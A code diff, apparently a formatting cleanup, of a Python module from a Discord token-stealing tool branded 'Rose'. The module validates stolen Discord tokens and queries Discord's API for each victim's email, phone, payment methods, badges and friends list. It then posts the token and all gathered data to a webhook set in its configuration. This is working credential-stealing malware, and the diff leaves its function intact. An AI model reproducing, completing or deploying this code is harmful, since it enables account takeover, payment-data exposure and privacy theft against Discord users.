@@ -1,12 +1,15 @@
 from json import loads, dumps
 from urllib.request import Request, urlopen
 from bin.config import Config
+
 cc = Config()
 from bin.ipinf import Info
+
 ifx = Info()
 from datetime import datetime
 
-class DiscordX():
+
+class DiscordX:
     def __init__(self):
         self.webhook = cc.get_webhook()
         if cc.get_debug_mode:
@@ -67,12 +70,9 @@ class DiscordX():
             },
         ]
         headers = {
-            "Authorization":
-            token,
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
         }
         try:
             friendlist = loads(
@@ -80,7 +80,11 @@ class DiscordX():
                     Request(
                         "https://discord.com/api/v6/users/@me/relationships",
                         headers=headers,
-                    )).read().decode())
+                    )
+                )
+                .read()
+                .decode()
+            )
         except Exception:
             return False
 
@@ -97,16 +101,12 @@ class DiscordX():
                 uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
         return uhqlist
 
-
     @staticmethod
     def GetBilling(token):
         headers = {
-            "Authorization":
-            token,
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
         }
         try:
             billingjson = loads(
@@ -114,7 +114,11 @@ class DiscordX():
                     Request(
                         "https://discord.com/api/users/@me/billing/payment-sources",
                         headers=headers,
-                    )).read().decode())
+                    )
+                )
+                .read()
+                .decode()
+            )
         except Exception:
             return False
 
@@ -130,7 +134,6 @@ class DiscordX():
                     billing += "<:paypal:1151916071092244520> "
 
         return billing
-
 
     @staticmethod
     def GetBadge(flags):
@@ -197,22 +200,15 @@ class DiscordX():
 
         return OwnedBadges
 
-
     @staticmethod
     def GetTokenInfo(token):
         headers = {
-            "Authorization":
-            token,
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
         }
 
-        userjson = loads(
-            urlopen(
-                Request("https://discordapp.com/api/v6/users/@me",
-                        headers=headers)).read().decode())
+        userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
         username = userjson["username"]
         hashtag = userjson["discriminator"]
         email = userjson["email"]
@@ -233,33 +229,24 @@ class DiscordX():
 
         return username, hashtag, email, idd, pfp, flags, nitro, phone
 
-
     @staticmethod
     def checkToken(token):
         headers = {
-            "Authorization":
-            token,
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
         }
         try:
-            urlopen(
-                Request("https://discordapp.com/api/v6/users/@me",
-                        headers=headers))
+            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
             return True
         except Exception:
             return False
 
-
     def uploadToken(self, token):
         global hook
         headers = {
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
         }
         username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)
 
@@ -280,64 +267,58 @@ class DiscordX():
 
         current_time_iso = datetime.now().isoformat()
         data = {
-            "content":
-            "",
-            "embeds": [{
-                "title":
-                "Rose Report",
-                "description":
-                "Rose Instance - Token Information",
-                "color":
-                cc.get_color(),
-                "fields": [
-                    {
-                        "name": "Token:",
-                        "value": f"||`{token}`||",
-                        "inline": False,
+            "content": "",
+            "embeds": [
+                {
+                    "title": "Rose Report",
+                    "description": "Rose Instance - Token Information",
+                    "color": cc.get_color(),
+                    "fields": [
+                        {
+                            "name": "Token:",
+                            "value": f"||`{token}`||",
+                            "inline": False,
+                        },
+                        {
+                            "name": "Email:",
+                            "value": f"`{email}`",
+                            "inline": False,
+                        },
+                        {
+                            "name": "Phone:",
+                            "value": f"`{phone}`",
+                            "inline": False,
+                        },
+                        {
+                            "name": "Badges:",
+                            "value": f"{nitro}{badge}",
+                            "inline": False,
+                        },
+                        {
+                            "name": "Billing:",
+                            "value": f"{billing}",
+                            "inline": False,
+                        },
+                        {
+                            "name": "Friends:",
+                            "value": f"{friends}",
+                            "inline": False,
+                        },
+                    ],
+                    "author": {
+                        "name": f"{username}#{hashtag} ({idd})",
+                        "icon_url": f"{pfp}",
                     },
-                    {
-                        "name": "Email:",
-                        "value": f"`{email}`",
-                        "inline": False,
+                    "footer": {
+                        "text": cc.get_footer(),
+                        "icon_url": cc.get_avatar(),
                     },
-                    {
-                        "name": "Phone:",
-                        "value": f"`{phone}`",
-                        "inline": False,
-                    },
-                    {
-                        "name": "Badges:",
-                        "value": f"{nitro}{badge}",
-                        "inline": False,
-                    },
-                    {
-                        "name": "Billing:",
-                        "value": f"{billing}",
-                        "inline": False,
-                    },
-                    {
-                        "name": "Friends:",
-                        "value": f"{friends}",
-                        "inline": False,
-                    },
-                ],
-                "author": {
-                    "name": f"{username}#{hashtag} ({idd})",
-                    "icon_url": f"{pfp}",
-                },
-                "footer": {
-                    "text": cc.get_footer(),
-                    "icon_url": cc.get_avatar(),
-                },
-                "thumbnail": {
-                    "url": f"{pfp}"
-                },
-                "timestamp": current_time_iso,
-            }],
-            "avatar_url":
-            cc.wh_avatar,
-            "username":
-            cc.wh_name,
+                    "thumbnail": {"url": f"{pfp}"},
+                    "timestamp": current_time_iso,
+                }
+            ],
+            "avatar_url": cc.wh_avatar,
+            "username": cc.wh_name,
             "attachments": [],
         }
         urlopen(Request(self.webhook, data=dumps(data).encode(), headers=headers))
